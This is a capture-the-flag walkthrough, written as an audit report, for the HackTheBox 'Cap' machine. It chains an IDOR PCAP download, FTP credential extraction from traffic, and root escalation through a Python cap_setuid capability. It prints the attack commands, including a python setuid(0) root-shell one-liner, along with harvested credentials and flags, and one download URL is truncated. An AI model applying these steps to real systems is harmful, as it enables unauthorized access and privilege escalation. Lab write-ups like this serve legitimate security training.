# 🧢 Cap - HackTheBox Machine Walkthrough

**Target:** 10.129.68.112 | **OS:** Linux | **Difficulty:** Easy  
**Auditor:** Juan Felipe Serna | **Date:** 2026-07-28

---

## 📌 Executive Summary

This security audit of the HTB machine "Cap" successfully identified and exploited a critical chain of vulnerabilities:

1. **IDOR (Insecure Direct Object Reference)** in the web application's packet capture download endpoint allowed unauthorized access to live network traffic.
2. **Credential Harvesting** from the captured PCAP file revealed plaintext FTP credentials (`nathan:Buck3tH4TF0RM3!`), leading to initial access.
3. **Linux Capabilities Misconfiguration** (`cap_setuid+ep` on Python 3.8) enabled privilege escalation to root.

**Flags Obtained:**
- **User:** `1caba3a8441c940f425925de1550a266`
- **Root:** `05e335171411e72ea02cbed2e5686331`

**Impact:** Full system compromise from a low-privileged user to root.

**Recommendations:**
- Replace sequential IDs with UUIDs and enforce server-side session validation.
- Disable FTP in favor of SFTP/FTPS.
- Remove the `cap_setuid+ep` capability from Python (`setcap -r /usr/bin/python3.8`).

---

## 🧭 Attack Path Summary
Reconnaissance (Nmap)
↓
Web Enumeration (IDOR in /data/ & /download/)
↓
PCAP Download (ID 0 → live capture)
↓
Credential Extraction (FTP plaintext: nathan:Buck3tH4TF0RM3!)
↓
FTP Access → user.txt
↓
SSH Access (as nathan)
↓
Linux Capabilities Enumeration (python3.8 = cap_setuid+ep)
↓
Python Exploit (os.setuid(0)) → Root Shell
↓
Root Flag Captured

---

## 🔍 Phase-by-Phase Breakdown

### Phase 1: Reconnaissance & Environment Setup

To ensure professional operational hygiene, the audit process begins by deploying a standardized workspace on the attacking machine. Initial command-line interactions involved initializing the master project folder and navigating directly into the newly created directory to establish a clean base of operations.

![Project Root Directory Creation and Navigation](./assets/Creamos_Cap.png)

*Figure 1: Initial creation of the target machine project root directory and workspace navigation.*

Following the setup of the primary project folder, a specialized Bash function named `mkt` was executed to automatically deploy the internal directory architecture. This maps out dedicated storage spaces for isolated network scans (`nmap/`), looted target assets (`content/`), and development scripts (`scripts/`).

![Workspace Architecture Design](./assets/Funcion_Mkt.png)

*Figure 2: Custom mkt function definition and automated workspace architecture setup.*

Once inside the dedicated scanning environment, an ICMP echo request (`ping`) was issued to verify network connectivity with the target host and perform initial operating system fingerprinting via TTL analysis.

![ICMP Connectivity Verification](./assets/primer_Ping.png)

*Figure 3: Active host verification and network response analysis.*

The target host successfully responded to the request. The network packet analysis revealed a **TTL (Time to Live) of 63**, which is heavily consistent with a **Linux** kernel system (default TTL 64), narrowing down our upcoming enumeration vectors.

* **Port Scanning:** Nmap discovered ports 21 (FTP), 22 (SSH), 80 (HTTP). *(Placeholder for Nmap scan description/image)*
* **Service Detection:** vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn (Python web app).

### Phase 2: Exploitation (IDOR & PCAP)
- **IDOR Discovery:** The endpoint `/download/` uses sequential IDs. Testing `0` revealed a live PCAP with 72 packets.
- **Download:** `wget http://10.129.68 -O 0.pcap`
- **Credential Extraction:** `strings 0.pcap | grep -E "USER|PASS"` → `nathan:Buck3tH4TF0RM3!`
- **Initial Access:** FTP login and download of `user.txt`.

### Phase 3: Privilege Escalation
- **SSH Access:** `ssh nathan@10.129.68.112`
- **Enumeration:** `getcap -r / 2>/dev/null | grep python` → `/usr/bin/python3.8 = cap_setuid+ep`
- **Exploitation:** `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- **Root Confirmation:** `whoami` → `root`
- **Flag:** `cat /root/root.txt` → `05e335171411e72ea02cbed2e5686331`

---

## 🛡️ Remediation & Hardening

| Vulnerability | Root Cause | Recommended Fix |
| :--- | :--- | :--- |
| **IDOR on `/download/`** | Sequential numeric IDs without session validation. | Use UUIDs (e.g., `/download/uuid`), enforce user authentication, and validate permissions server-side. |
| **FTP Credentials in PCAP** | Exposing internal packet captures to unauthenticated users. | Restrict PCAP access to administrators. Disable FTP; use SFTP with key-based authentication. |
| **Python `cap_setuid+ep`** | Misconfigured Linux capability on a widely available binary. | Remove the capability: `setcap -r /usr/bin/python3.8`. Audit all binaries with `getcap -r /`. |

---

## 📚 Lessons Learned

- **IDOR** is a subtle but critical flaw that can expose sensitive internal data (like PCAPs) if not properly controlled.
- **Network traffic analysis** (even simple `strings` or `tshark` filters) is a powerful post-exploitation technique for credential harvesting.
- **Linux Capabilities** are a powerful security feature, but when misconfigured (e.g., `cap_setuid+ep` on Python), they can be as dangerous as SUID binaries.
- **Defense in depth** requires not only patching applications but also hardening system configurations (capabilities, file permissions, and service exposure).

---

## 🏁 Conclusion

The "Cap" machine is an excellent demonstration of how a single misconfiguration (IDOR) can cascade into full system compromise. The attack chain is clear:
1. Exploit IDOR to steal credentials.
2. Use credentials to gain initial access.
3. Abuse Linux capabilities to become root.

This walkthrough highlights the importance of secure coding practices, network encryption, and regular system hardening audits. The findings and remediation steps provided here can be directly applied to real-world security assessments.

---
*Writeup prepared for the HackTheBox Cap machine by Juan Felipe Serna. All commands and flags are documented for educational purposes.*
